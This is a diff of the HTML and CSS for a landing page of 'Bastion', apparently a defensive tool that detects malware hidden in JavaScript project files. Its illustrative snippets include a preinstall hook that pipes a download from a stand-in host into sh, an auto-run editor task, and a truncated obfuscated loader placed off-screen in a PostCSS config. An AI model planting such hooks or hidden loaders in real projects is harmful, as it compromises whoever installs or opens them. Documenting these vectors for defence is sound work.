-  position: relative; align-self: stretch; min-height: 320px; aspect-ratio: 16 / 11; overflow: hidden; border-left: 1px solid var(--card-line);
-  -webkit-mask-image: linear-gradient(#000 72%, transparent); mask-image: linear-gradient(#000 72%, transparent);
-}
-.fig-shot img { position: absolute; top: 40px; left: -30%; width: 150%; max-width: none; filter: drop-shadow(0 20px 50px rgba(0, 0, 0, .5)); }
-.respond-foot { margin-top: 16px; display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 16px; }
-.foot-card { display: grid; gap: 14px; align-content: start; padding: 24px; border-radius: 16px; border: 1px solid var(--card-line); background: var(--card-bg); }
-.foot-label { padding: 0; font: 12.5px/1.4 var(--mono); color: var(--dim); }
-.modes { display: grid; gap: 14px; }
-.modes legend { float: left; width: 100%; } /* a floated legend is laid out like any other child, not on the border */
-.seg { position: relative; display: inline-flex; gap: 2px; width: fit-content; max-width: 100%; padding: 3px; border-radius: 10px; border: 1px solid var(--hairline); background: var(--bg); }
-.seg input { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-.seg label { padding: 7px 16px; border-radius: 7px; font-size: 14px; font-weight: 500; color: var(--dim); cursor: pointer; transition: color .15s, background-color .15s; }
-.seg label:hover { color: var(--text); }
-.seg input:checked + label { background: var(--surface2); color: var(--text); box-shadow: inset 0 1px 0 rgba(255, 255, 255, .06), 0 1px 2px rgba(0, 0, 0, .4); }
-.seg input:focus-visible + label { outline: 2px solid var(--accent-hi); outline-offset: 1px; }
-.mode-desc { font-size: 15px; color: var(--dim); }
-@supports selector(:has(*)) {
-  .mode-desc { display: none; }
-  .modes:has(#mode-contain:checked) .d-contain,
-  .modes:has(#mode-observe:checked) .d-observe,
-  .modes:has(#mode-off:checked) .d-off { display: block; }
-}
-.chips { display: flex; flex-wrap: wrap; gap: 8px; }
-.chips li { padding: 5px 11px; border-radius: 999px; border: 1px solid var(--border); background: rgba(255, 255, 255, .02); font-size: 13.5px; color: var(--text); }
-.foot-note { font-size: 15px; color: var(--dim); }
+  /* end */
+  .end { text-align: center; }
+  .end .wrap { display: grid; justify-items: center; gap: 26px; }
+  .end h2 { font-size: clamp(2.6rem, 6vw, 4.6rem); }
+  .end .actions { justify-content: center; }
+  .fine { color: var(--faint); font-size: 13.5px; margin: 0; max-width: 40em; }
+  footer { border-top: 1px solid var(--line); padding-block: 28px 40px; }
+  footer .wrap { display: flex; flex-wrap: wrap; align-items: center; gap: 12px 28px; color: var(--faint); font-size: 13.5px; }
+  footer a { color: var(--dim); text-decoration: none; }
+  footer a:hover { color: var(--text); }
 
-/* guards */
-.bento { margin-top: clamp(48px, 6vw, 72px); display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 16px; }
-.card { position: relative; display: flex; flex-direction: column; gap: 24px; min-width: 0; padding: 24px; border-radius: 18px; border: 1px solid var(--card-line); background: var(--card-bg); overflow: hidden; }
-.card-wide { grid-column: span 2; }
-.card-text { display: grid; gap: 8px; margin-top: auto; }
-.card-num { font: 12.5px/1.4 var(--mono); color: var(--accent-hi); }
-.card-text p { max-width: 44em; font-size: 15px; color: var(--dim); }
-.demo { position: relative; border-radius: 12px; border: 1px solid var(--hairline); background: var(--bg); font: 12.5px/1.7 var(--mono); color: var(--code); overflow: hidden; }
-.demo p { white-space: pre-wrap; overflow-wrap: anywhere; }
-.t-dim { color: var(--dim); }
-.t-faint { color: var(--faint); }
-.t-bad { color: var(--red-text); }
-.t-ok { color: #86D1A9; }
-.t-warn { color: #F7B77E; }
-.t-acc { color: var(--accent-hi); }
-.demo-exec { flex: 1 1 auto; display: flex; flex-direction: column; justify-content: flex-end; min-height: 210px; padding: 92px 18px 18px; }
-.notif {
-  position: absolute; top: 14px; right: 14px; width: min(360px, calc(100% - 28px));
-  display: flex; align-items: flex-start; gap: 10px; padding: 10px 12px; border-radius: 14px;
-  background: rgba(44, 45, 50, .85); -webkit-backdrop-filter: blur(20px); backdrop-filter: blur(20px);
-  box-shadow: 0 0 0 1px rgba(255, 255, 255, .08), 0 12px 30px rgba(0, 0, 0, .45);
-  font-family: var(--sans);
-}
-.notif img { flex: none; width: 30px; height: 30px; border-radius: 7px; }
-.notif-title { display: flex; justify-content: space-between; gap: 8px; font-size: 13px; font-weight: 600; line-height: 1.35; color: var(--text); }
-.notif-title span { font-weight: 400; color: var(--dim); }
-.notif p { font-size: 12.5px; line-height: 1.4; white-space: normal; color: #C5C7CD; }
-.dep { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 2px 12px; padding: 12px 14px; border-top: 1px solid var(--hairline); }
-.dep:first-child { border-top: 0; }
-.dep-name { color: var(--text); overflow-wrap: anywhere; }
-.dep-name span { display: block; margin-bottom: 2px; font-size: 11px; color: var(--faint); }
-.dep-why { font-size: 12px; color: var(--dim); }
-.sev { grid-row: span 2; align-self: center; padding: 2px 8px; border-radius: 999px; font-size: 11.5px; }
-.sev-critical { color: var(--red-text); background: rgba(235, 87, 87, .12); }
-.sev-high { color: #F7B77E; background: rgba(242, 153, 74, .12); }
-.fine { font-size: 13.5px; color: var(--dim); }
-.check { display: grid; grid-template-columns: 16px minmax(0, 1fr) auto; align-items: center; gap: 10px; padding: 12px 14px; border-top: 1px solid var(--hairline); font: 13.5px/1.4 var(--sans); }
-.check:first-child { border-top: 0; }
-.check-name { color: var(--dim); overflow-wrap: anywhere; }
-.check-name b { font-weight: 600; color: var(--text); }
-.check-meta { font-size: 12.5px; color: var(--dim); }
-.annot { margin: 0 14px 14px 40px; padding: 9px 12px; border-radius: 8px; border: 1px solid rgba(235, 87, 87, .3); background: rgba(235, 87, 87, .06); font: 12px/1.6 var(--mono); color: #F2B5B5; }
-.annot b { font-weight: 400; color: var(--text); }
-.demo-history { flex: 1 1 auto; display: grid; gap: 12px; align-content: center; padding: 16px 16px 14px; }
-.graph-scroll { overflow-x: auto; }
-.git-graph { width: 100%; min-width: 520px; height: auto; }
-.git-graph .lane { fill: none; stroke: #3A3C44; stroke-width: 1.5; }
-.git-graph .lane-gone { stroke: #34363D; stroke-dasharray: 3 4; }
-.git-graph .cm { fill: var(--bg); stroke: #5A5D66; stroke-width: 1.5; }
-.git-graph .cm-bad { fill: var(--red); stroke: var(--red); }
-.git-graph .cm-gone { fill: var(--bg); stroke: var(--red); stroke-dasharray: 2 2; }
-.git-graph text { font: 11px var(--mono); fill: var(--dim); }
-.git-graph .g-bad { fill: var(--red-text); }
+  /* motion: one quiet moment — the dashed line runs out to where the code hides */
+  @media (prefers-reduced-motion: no-preference) {
+    .trail { animation: run 1.4s cubic-bezier(0.2, 0.7, 0.2, 1) 0.35s both; }
+    .offscreen { animation: glow 2.6s ease-in-out 1.7s infinite; }
+    .problem .dot { animation: beat 2.6s ease-in-out 1.7s infinite; }
+    @keyframes run { from { transform: scaleX(0.05); } to { transform: scaleX(1); } }
+    @keyframes glow { 50% { box-shadow: 0 0 0 5px rgba(255, 90, 95, 0.12); } }
+    @keyframes beat { 50% { box-shadow: 0 0 0 7px rgba(255, 90, 95, 0.05); } }
+  }
 
-/* agents */
-.agents-grid, .agents-row { display: grid; grid-template-columns: minmax(0, 1.15fr) minmax(0, 1fr); gap: 16px; }
-.agents-grid { margin-top: clamp(48px, 6vw, 72px); align-items: start; }
-.agents-row { margin-top: 16px; align-items: start; }
-.window { min-width: 0; border-radius: 16px; border: 1px solid var(--card-line); background: var(--bg); overflow: hidden; box-shadow: 0 30px 80px -30px rgba(0, 0, 0, .7); }
-.window-bar { display: flex; flex-wrap: wrap; align-items: center; gap: 8px 14px; min-height: 42px; padding: 6px 14px; border-bottom: 1px solid var(--hairline); background: rgba(255, 255, 255, .02); font: 12px/1.4 var(--mono); color: var(--dim); }
-.dots { display: flex; gap: 6px; }
-.dots i { width: 10px; height: 10px; border-radius: 50%; background: #2A2B30; }
-.session { display: grid; gap: 18px; padding: 22px 22px 26px; font: 13px/1.7 var(--mono); color: var(--code); }
-.session p { overflow-wrap: anywhere; }
-.s-user { color: var(--text); }
-.s-user::before { content: "› "; color: var(--accent-hi); }
-.s-tool { display: grid; gap: 2px; }
-.s-call { color: var(--text); }
-.s-call::before { content: "●"; margin-right: 10px; color: var(--green); }
-.s-call b { font-weight: 400; color: var(--accent-hi); margin-right: 8px; }
-.s-out { padding-left: 20px; color: var(--dim); }
-.s-reply { font: 14.5px/1.6 var(--sans); color: #D8DAE0; }
-.side { display: grid; gap: 16px; min-width: 0; }
-.panel-card { display: grid; gap: 14px; align-content: start; min-width: 0; padding: 22px; border-radius: 16px; border: 1px solid var(--card-line); background: var(--card-bg); }
-.panel-card .h3 + p, .panel-note { font-size: 14.5px; color: var(--dim); }
-.tablist { display: flex; flex-wrap: wrap; gap: 4px; }
-.tab { padding: 6px 12px; border-radius: 8px; border: 1px solid transparent; background: none; color: var(--dim); font: 500 13.5px/1.3 var(--sans); cursor: pointer; transition: color .15s, background-color .15s, border-color .15s; }
-.tab:hover { color: var(--text); }
-.tab[aria-selected="true"] { color: var(--text); background: var(--surface2); border-color: var(--border); }
-.tabpanel { display: grid; gap: 10px; }
-.code-block { position: relative; min-width: 0; border-radius: 10px; border: 1px solid var(--hairline); background: var(--bg); }
-.code-block pre { margin: 0; padding: 14px 86px 14px 16px; overflow-x: auto; font: 12.5px/1.7 var(--mono); color: var(--code); }
-.copy {
-  position: absolute; top: 8px; right: 8px; display: inline-flex; align-items: center; gap: 6px;
-  height: 28px; padding-inline: 9px; border-radius: 7px; border: 1px solid var(--border); background: var(--surface);
-  font: 12px/1 var(--mono); color: var(--dim); cursor: pointer; transition: color .15s, border-color .15s;
-}
-.copy:hover { color: var(--text); border-color: #3B3D44; }
-.copy.is-done { color: var(--green); }
-.tool-row { display: grid; grid-template-columns: minmax(0, 12.5em) minmax(0, 1fr); gap: 4px 16px; padding-block: 10px; border-top: 1px solid var(--hairline); font-size: 14px; }
-.tool-row:first-child { border-top: 0; padding-top: 0; }
-.tool-row code { font-size: 12.5px; line-height: 1.8; color: var(--accent-hi); overflow-wrap: anywhere; }
-.tool-row span { color: var(--dim); }
-.guard-out { padding: 14px 16px; border-radius: 10px; border: 1px solid rgba(235, 87, 87, .25); background: rgba(235, 87, 87, .05); font: 12.5px/1.7 var(--mono); color: var(--code); }
-.guard-out p { overflow-wrap: anywhere; }
-.callout { display: grid; gap: 12px; align-content: start; padding: 28px; border-radius: 16px; border: 1px solid rgba(94, 106, 210, .35); background: linear-gradient(180deg, rgba(94, 106, 210, .13), rgba(94, 106, 210, .03)); }
-.callout .h3 { font-size: 1.3rem; font-stretch: 94%; letter-spacing: -.02em; }
-.callout p { font-size: 15px; color: #B4B8C4; }
-
-/* cli */
-.term { margin-top: clamp(48px, 6vw, 72px); }
-.term .tablist { gap: 2px; }
-.term .tab { font: 12.5px/1.3 var(--mono); padding: 5px 10px; }
-.term-body { min-height: 360px; padding: 20px 22px 24px; font: 13px/1.75 var(--mono); color: var(--code); }
-.term-body p { white-space: pre-wrap; overflow-wrap: anywhere; }
-.term-body .cmd::before { content: "$ "; color: var(--faint); }
-.term-body .cmd { color: var(--text); }
-.exit-codes { margin-top: 16px; display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 16px; }
-.exit { display: grid; grid-template-columns: auto minmax(0, 1fr); align-items: baseline; gap: 4px 16px; padding: 18px 20px; border-radius: 14px; border: 1px solid var(--card-line); background: var(--card-bg); }
-.exit b { grid-row: span 2; font: 400 28px/1 var(--mono); }
-.exit p { font-size: 14px; color: var(--dim); }
-.exit .h3 { font-size: 15px; }
-
-/* principles */
-.principles { margin-top: clamp(48px, 6vw, 72px); display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); border-top: 1px solid var(--hairline); border-left: 1px solid var(--hairline); }
-.principle { display: grid; gap: 10px; align-content: start; padding: 28px 28px 32px; border-right: 1px solid var(--hairline); border-bottom: 1px solid var(--hairline); }
-.principle svg { margin-bottom: 6px; color: var(--accent-hi); }
-.principle kbd { width: fit-content; margin-bottom: 6px; padding: 2px 8px; border-radius: 6px; border: 1px solid var(--border); border-bottom-width: 2px; background: var(--surface); font-size: 12.5px; color: var(--accent-hi); }
-.principle p { font-size: 15px; color: var(--dim); }
-
-/* limits */
-.limits { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1.7fr); gap: 40px 72px; }
-.limit-list { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 36px 48px; }
-.limit { display: grid; gap: 8px; align-content: start; }
-.limit p { font-size: 15px; color: var(--dim); }
-
-/* download */
-.download { position: relative; isolation: isolate; overflow: clip; }
-.download::before { content: ""; position: absolute; z-index: -1; left: -10%; bottom: -40%; width: 70%; height: 90%; background: radial-gradient(closest-side, rgba(94, 106, 210, .18), transparent); pointer-events: none; }
-.dl { display: grid; grid-template-columns: minmax(0, 1.25fr) minmax(0, 1fr); gap: 56px; align-items: center; }
-.dl-main { display: grid; gap: 24px; justify-items: start; min-width: 0; }
-.dl-icon { width: 72px; height: 72px; border-radius: 17px; box-shadow: 0 16px 48px -8px rgba(94, 106, 210, .55); }
-.dl-note { max-width: 36em; font-size: 14px; color: var(--dim); }
-.dl-source { display: grid; gap: 10px; width: 100%; max-width: 580px; }
-.dl-panel { justify-self: center; width: min(340px, 100%); }
-.dl-panel img { filter: drop-shadow(0 30px 60px rgba(0, 0, 0, .6)); }
-.dl-panel figcaption { margin-top: 14px; text-align: center; font: 12.5px/1.5 var(--mono); color: var(--dim); }
-
-/* footer */
-.footer { padding-block: 56px 40px; border-top: 1px solid var(--hairline); }
-.foot { display: grid; grid-template-columns: minmax(0, 1.5fr) repeat(3, minmax(0, 1fr)); gap: 40px 32px; }
-.foot-brand { display: grid; gap: 14px; align-content: start; }
-.foot-brand p { max-width: 24em; font-size: 14px; color: var(--dim); }
-.foot-h { margin-bottom: 12px; font-size: 13px; font-weight: 500; color: var(--text); }
-.foot-col a { display: block; width: fit-content; padding-block: 4px; font-size: 14px; color: var(--dim); transition: color .15s; }
-.foot-col a:hover { color: var(--text); }
-.foot-base { margin-top: 48px; padding-top: 20px; border-top: 1px solid var(--hairline); display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 12px 24px; font-size: 13px; color: var(--dim); }
-.status { display: inline-flex; align-items: center; gap: 8px; transition: color .15s; }
-.status:hover { color: var(--text); }
-.status i { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 0 3px rgba(76, 183, 130, .16); }
-
-/* narrower screens */
-@media (max-width: 1100px) {
-  .vectors { grid-template-columns: minmax(0, 1fr); max-width: 680px; }
-}
-@media (max-width: 1040px) {
-  .bento { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-}
-@media (max-width: 980px) {
-  .layers, .agents-grid, .agents-row { grid-template-columns: minmax(0, 1fr); }
-  .principles { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-}
-@media (max-width: 920px) {
-  .nav-links { display: none; }
-}
-@media (max-width: 900px) {
-  .head-split, .limits, .dl { grid-template-columns: minmax(0, 1fr); }
-  .fig-panel { grid-template-columns: minmax(0, 1fr); }
-  .fig-shot { border-left: 0; border-top: 1px solid var(--card-line); }
-}
-@media (max-width: 820px) {
-  .foot { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-  .foot-brand { grid-column: 1 / -1; }
-}
-@media (max-width: 800px) {
-  .runs-grid { grid-template-columns: minmax(0, 1fr); }
-  .runs-col { padding-inline: 0; border-left: 0; border-top: 1px solid var(--hairline); }
-  .runs-col:first-child { border-top: 0; }
-  .respond-foot { grid-template-columns: minmax(0, 1fr); }
-}
-@media (max-width: 720px) {
-  .exit-codes { grid-template-columns: minmax(0, 1fr); }
-}
-@media (max-width: 680px) {
-  .bento { grid-template-columns: minmax(0, 1fr); }
-  .card-wide { grid-column: auto; }
-}
-@media (max-width: 620px) {
-  .limit-list { grid-template-columns: minmax(0, 1fr); }
-}
-@media (max-width: 600px) {
-  .principles { grid-template-columns: minmax(0, 1fr); }
-}
-@media (max-width: 560px) {
-  .demo-exec { padding-top: 14px; }
-  .notif { position: static; width: auto; margin-bottom: 14px; }
-  .tool-row { grid-template-columns: minmax(0, 1fr); }
-  .term-body { min-height: 0; }
-}
-@media (max-width: 400px) {
-  .nav-gh span { display: none; }
-}
-@media (prefers-reduced-motion: reduce) {
-  html { scroll-behavior: auto; }
-  .sweep, .blip-dot, .blip-ring { animation: none; }
-  .blip-ring { opacity: 0; }
-}
+  @media (max-width: 960px) {
+    .hero .wrap { grid-template-columns: 1fr; }
+    .nav-links { display: none; }
+    .trio, .notes { grid-template-columns: 1fr; }
+    .rules { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    .spots { grid-template-columns: 1fr; }
+    .spot, .spot + .spot { padding: 24px 0 8px; border-left: 0; }
+    .spot + .spot { border-top: 1px solid var(--line); }
+  }
+  @media (max-width: 560px) {
+    .rules { grid-template-columns: 1fr; }
+    .nav-actions .btn:not(.solid) { display: none; }
+    .ide-code { font-size: 11px; }
+    .ln { grid-template-columns: 30px 1fr; }
+    .ln .n { padding-right: 10px; }
+    .offscreen { right: 8px; }
+    .panel pre { font-size: 12px; padding: 60px 16px 20px; }
+  }
 </style>
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
 
 <header class="nav">
-  <div class="wrap nav-bar">
-    <a class="brand" href="#top">
-      <img src="assets/icon.png" width="24" height="24" alt="">
-      <span>Bastion</span>
+  <div class="wrap">
+    <a class="brand" href="#top" aria-label="Bastion, back to top">
+      <svg width="22" height="22" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.4l7.6 3v5.8c0 4.7-3.2 8.8-7.6 10.4-4.4-1.6-7.6-5.7-7.6-10.4V5.4l7.6-3z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M8.5 12.1l2.4 2.4 4.7-4.9" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Bastion
     </a>
-    <nav aria-label="Sections">
-      <ul class="nav-links">
-        <li><a href="#layers">How it works</a></li>
-        <li><a href="#respond">Responder</a></li>
-        <li><a href="#guards">Guards</a></li>
-        <li><a href="#agents">AI agents</a></li>
-        <li><a href="#cli">CLI</a></li>
-      </ul>
+    <nav class="nav-links" aria-label="Sections">
+      <a href="#how">How it works</a>
+      <a href="#app">The app</a>
+      <a href="#developers">Developers</a>
     </nav>
-    <div class="nav-end">
-      <a class="nav-gh" href="https://github.com/realanshuman/bastion" aria-label="Bastion on GitHub">
-        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5.5 4.5 2 8l3.5 3.5M10.5 4.5 14 8l-3.5 3.5"/></svg>
-        <span>GitHub</span>
-      </a>
-      <a class="btn btn-primary btn-sm" href="https://github.com/realanshuman/bastion/releases/latest">Download</a>
+    <span class="spacer"></span>
+    <div class="nav-actions">
+      <a class="btn small" href="https://github.com/realanshuman/bastion">GitHub</a>
+      <a class="btn small solid" href="https://github.com/realanshuman/bastion/releases/latest">Download</a>
     </div>
   </div>
 </header>
 
-<main id="main">
-
-  <section class="hero" id="top">
+<main id="top">
+  <section class="hero">
     <div class="wrap">
-      <a class="pill" href="https://github.com/realanshuman/bastion/releases">
-        <span class="pill-tag">4.1</span>
-        <span class="pill-text">Dependency guard, history hunt and Team PR guard</span>
-        <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 8h10M9 4l4 4-4 4"/></svg>
-      </a>
-      <h1 class="h1 grad">Stop hidden malware<br> before it runs</h1>
-      <div class="hero-row">
-        <p class="lead hero-lead">Bastion guards your JavaScript projects, and the AI agents working in them, from payloads hidden in config files, install hooks and editor tasks. When something gets in, it investigates, contains it and tells you exactly what’s left to do.</p>
-        <div class="hero-actions">
-          <a class="btn btn-primary" href="https://github.com/realanshuman/bastion/releases/latest">
-            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M8 2.5v8M4.5 7 8 10.5 11.5 7M3 13.5h10"/></svg>
-            Download for macOS
-          </a>
-          <a class="btn btn-ghost" href="https://github.com/realanshuman/bastion">View source</a>
+      <div class="hero-copy">
+        <a class="badge" href="https://github.com/realanshuman/bastion/releases/latest"><b>New in 4.2</b> Fixes in one click <span aria-hidden="true">→</span></a>
+        <h1>Stop hidden malware before it runs</h1>
+        <p class="lede">Attackers now hide code in the config files, install scripts and old branches of JavaScript projects — pushed 2,000 spaces off-screen, where no review looks. Bastion finds it, stops npm from running it, and shows you the exact line and the fix.</p>
+        <div class="actions">
+          <a class="btn solid" href="https://github.com/realanshuman/bastion/releases/latest">Download for macOS</a>
+          <a class="btn" href="#developers">For developers</a>
         </div>
+        <p class="meta"><span>Free and open source</span><span>macOS 14 or later</span><span>Runs on your Mac</span></p>
       </div>
-      <p class="meta"><span>Free and open source</span><span>MIT</span><span>macOS 14 or later</span><span>Apple silicon and Intel</span></p>
-    </div>
-    <div class="wrap">
-      <figure class="hero-shot">
-        <img src="assets/window-overview.webp" width="2360" height="1520" fetchpriority="high" decoding="async" alt="The Bastion window. It says “You’re protected”, watching 4 repositories, and reports a contained attack: injected code removed from 1 file and 1 address blocked, with 5 to-dos. Below are switches for the real-time watcher, scheduled scan, execution guard and auto-respond.">
+
+      <figure class="ide" aria-label="A postcss config that looks clean. Bastion shows hidden code on line 8 at column 2,003 and blocks npm run dev.">
+        <div class="ide-top">
+          <span class="lights" aria-hidden="true"><i></i><i></i><i></i></span>
+          <span class="ide-file"><b>postcss.config.js</b> · storefront</span>
+        </div>
+        <div class="ide-code" aria-hidden="true">
+          <div class="ln"><span class="n">1</span><span class="c"><span class="k">import</span> { createRequire } <span class="k">from</span> <span class="s">'module'</span>;</span></div>
+          <div class="ln"><span class="n">2</span><span class="c"><span class="k">const</span> require = createRequire(<span class="k">import</span>.meta.url);</span></div>
+          <div class="ln"><span class="n">3</span><span class="c"><span class="k">export default</span> {</span></div>
+          <div class="ln"><span class="n">4</span><span class="c">  plugins: {</span></div>
+          <div class="ln"><span class="n">5</span><span class="c">    tailwindcss: {},</span></div>
+          <div class="ln"><span class="n">6</span><span class="c">    autoprefixer: {},</span></div>
+          <div class="ln"><span class="n">7</span><span class="c">  },</span></div>
+          <div class="ln hit"><span class="n">8</span><span class="c">};<span class="trail"></span><span class="offscreen">2,000 spaces →</span></span></div>
+        </div>
+        <div class="ide-panel">
+          <div class="panel-head"><b>Bastion</b> found 1 problem</div>
+          <div class="problem">
+            <span class="dot" aria-hidden="true"></span>
+            <div>
+              <p class="p-title">Hidden code on line 8, at column 2,003</p>
+              <p class="p-code">global.o='1-183';var _$_d8bf=(function(i,p){var k=i.length;var l=[];…</p>
+              <p class="p-meta">2,000 blank characters push it off-screen. It runs the moment a dev server loads this file.</p>
+            </div>
+          </div>
+          <div class="blocked"><span class="x" aria-hidden="true">✕</span><span>Blocked <code>npm run dev</code> in storefront</span></div>
+        </div>
       </figure>
     </div>
   </section>
 
-  <section class="runs" aria-label="Where Bastion works">
-    <div class="wrap">
-      <div class="runs-grid">
-        <div class="runs-col">
-          <p class="runs-label">Execution guard</p>
-          <p class="runs-names"><span>node</span><span>npm</span><span>npx</span><span>pnpm</span><span>yarn</span><span>bun</span></p>
-        </div>
-        <div class="runs-col">
-          <p class="runs-label">MCP server</p>
-          <p class="runs-names"><span>Claude Code</span><span>Cursor</span><span>Claude Desktop</span><span>Windsurf</span><span>Codex CLI</span></p>
-        </div>
-        <div class="runs-col">
-          <p class="runs-label">Team PR guard</p>
-          <p class="runs-names"><span>GitHub Actions</span></p>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div class="wrap">
+    <ul class="with" aria-label="Works with">
+      <li>Works with</li><li>npm</li><li>pnpm</li><li>yarn</li><li>bun</li><li>Next.js</li><li>Vite</li><li>Tailwind</li><li>Claude Code</li><li>Cursor</li><li>GitHub Actions</li>
+    </ul>
+  </div>
 
-  <section class="section" id="threat">
-    <div class="wrap">
-      <div class="head-split">
-        <div>
-          <p class="eyebrow">The attack</p>
-          <h2 class="h2 grad">Malware now hides in files you run without reading</h2>
-        </div>
-        <p class="lead">Attackers slip a payload into ordinary project files and wait for you to run a normal command. Once it runs, it quietly steals your tokens, browser sessions and saved passwords, then phones home.</p>
-      </div>
-
-      <div class="vectors">
-        <article class="vector">
-          <p class="file">
-            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round" aria-hidden="true"><path d="M9.5 1.75H4.25a1 1 0 0 0-1 1v10.5a1 1 0 0 0 1 1h7.5a1 1 0 0 0 1-1V4.5z"/><path d="M9.5 1.75V4.5h2.75"/></svg>
-            postcss.config.mjs
-          </p>
-          <div class="snippet" role="img" aria-label="A three-line PostCSS config. Line 3 continues far to the right, where hidden code starts at column 2,431.">
-            <span class="l"><i>1</i><span class="k">export default</span> {</span>
-            <span class="l"><i>2</i>  plugins: { tailwindcss: {} },</span>
-            <span class="l hit"><i>3</i>};<span class="far"></span><span class="flag">payload at col 2,431</span></span>
-          </div>
-          <p class="runs-on">Runs on <span class="c">npm run dev</span><span class="c">build</span><span class="c">test</span></p>
-          <p class="vector-desc">Build tools execute their config files. The payload sits after the real config, pushed past the edge of your editor.</p>
-        </article>
-
-        <article class="vector">
-          <p class="file">
-            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round" aria-hidden="true"><path d="M9.5 1.75H4.25a1 1 0 0 0-1 1v10.5a1 1 0 0 0 1 1h7.5a1 1 0 0 0 1-1V4.5z"/><path d="M9.5 1.75V4.5h2.75"/></svg>
-            package.json
-          </p>
-          <div class="snippet" role="img" aria-label="A package.json whose preinstall script downloads a shell script and pipes it into sh.">
-            <span class="l"><i>1</i><span class="s">"scripts"</span>: {</span>
-            <span class="l"><i>2</i>  <span class="s">"dev"</span>: <span class="s">"vite"</span>,</span>
-            <span class="l hit"><i>3</i>  <span class="s">"preinstall"</span>:</span>
-            <span class="l hit"><i>4</i>    <span class="s">"curl -s dl.example.dev</span> <span class="s">| sh"</span></span>
-            <span class="l"><i>5</i>}</span>
-          </div>
-          <p class="runs-on">Runs on <span class="c">npm install</span></p>
-          <p class="vector-desc">An install hook downloads and runs code the moment you install. The same trick hides in dependencies, deep in node_modules.</p>
-        </article>
-
-        <article class="vector">
-          <p class="file">
-            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linejoin="round" aria-hidden="true"><path d="M9.5 1.75H4.25a1 1 0 0 0-1 1v10.5a1 1 0 0 0 1 1h7.5a1 1 0 0 0 1-1V4.5z"/><path d="M9.5 1.75V4.5h2.75"/></svg>
-            .vscode/tasks.json
-          </p>
-          <div class="snippet" role="img" aria-label="An editor task that runs node init.js whenever the folder is opened.">
-            <span class="l"><i>1</i>{</span>
-            <span class="l"><i>2</i>  <span class="s">"label"</span>: <span class="s">"prepare"</span>,</span>
-            <span class="l"><i>3</i>  <span class="s">"command"</span>: <span class="s">"node init.js"</span>,</span>
-            <span class="l"><i>4</i>  <span class="s">"runOptions"</span>: {</span>
-            <span class="l hit"><i>5</i>    <span class="s">"runOn"</span>: <span class="s">"folderOpen"</span></span>
-            <span class="l"><i>6</i>  }</span>
-            <span class="l"><i>7</i>}</span>
-          </div>
-          <p class="runs-on">Runs on opening the folder</p>
-          <p class="vector-desc">An auto-run editor task fires as soon as the folder opens in VS Code or Cursor. No command needed.</p>
-        </article>
-      </div>
-    </div>
-  </section>
-
-  <section class="section ruled" id="layers">
+  <section id="where">
     <div class="wrap">
       <div class="head">
-        <p class="eyebrow">How it works</p>
-        <h2 class="h2 grad">Four layers between a payload and your Mac</h2>
-        <p class="lead">Each layer works on its own. Together they stop the attack at the door, catch it if it runs, clean up after it and sweep for anything left behind.</p>
+        <p class="eyebrow">Where it hides</p>
+        <h2>In the files nobody <em>reads</em></h2>
+        <p class="lede">These files run code the moment you use your project the normal way, and they're the last place anyone looks during a review.</p>
       </div>
-
-      <div class="layers">
-        <figure>
-          <svg id="fort" class="fort-svg" viewBox="-290 -290 580 580" role="img" aria-labelledby="fort-title">
-            <title id="fort-title">Plan of a five-bastion star fort with four walls, one for each layer, and a sweep turning over it</title>
-          </svg>
-          <figcaption class="fig-cap"><b>FIG 1</b>The sweep turns once every 12 seconds, as often as the watcher checks.</figcaption>
-        </figure>
-
-        <ol class="layer-list">
-          <li class="layer" data-ring="1">
-            <span class="layer-num">1.0</span>
-            <h3 class="h3">Prevent</h3>
-            <p>Command guards refuse to run dev, build or install in a tampered project. A git hook blocks pushing an infected config.</p>
-            <p class="parts"><a href="#exec-guard"><b>1.1</b>Execution guard</a><a href="#deps-guard"><b>1.2</b>Dependency guard</a><span><b>1.3</b>Push guard</span><a href="#pr-guard"><b>1.4</b>Team PR guard</a><a href="#hard-guard"><b>1.5</b>Agent hard-guard</a></p>
-          </li>
-          <li class="layer" data-ring="2">
-            <span class="layer-num">2.0</span>
-            <h3 class="h3">Detect &amp; stop</h3>
-            <p>A watcher checks every ~12 seconds, kills malware loaders and connections to known attacker servers, and quarantines what they leave behind.</p>
-            <p class="parts"><span><b>2.1</b>Watcher</span><span><b>2.2</b>Quarantine</span></p>
-          </li>
-          <li class="layer" data-ring="3">
-            <span class="layer-num">3.0</span>
-            <h3 class="h3">Respond</h3>
-            <p>The responder investigates, contains what it can prove and writes the incident report.</p>
